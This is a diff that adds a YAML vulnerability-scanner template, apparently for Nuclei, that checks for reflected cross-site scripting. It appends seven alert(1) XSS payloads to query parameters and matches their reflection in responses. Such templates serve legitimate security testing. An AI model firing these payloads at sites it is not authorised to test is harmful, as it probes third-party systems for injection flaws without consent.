@@ -1,0 +1,44 @@
+id: reflected-xss
+
+info:
+  name: Reflected XSS 
+  author: abdulrahman
+  severity: medium
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      xyz:
+        - "%26apos;);alert(1)//"
+        - "\"><script>alert(1)</script>"
+        - "%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+        - "'\"></alert(1)>"
+        - '"autofocus%20onfocus="alert(1)'
+        - "\"event-handler=alert(1)\""
+        - "'xss'=(1)"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        fuzz:
+          - "{{xyz}}"
+
+#    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<script>alert(1)</script>"
+          - "&apos;);alert(1)"
+          - "'></alert(1)>"
+          - "autofocus%20onfocus=\"alert(1)"
+          - "\"event-handler=alert(1)"
+          - "'xss'=(1)"
+
+      - type: status
+        status:
+          - 200
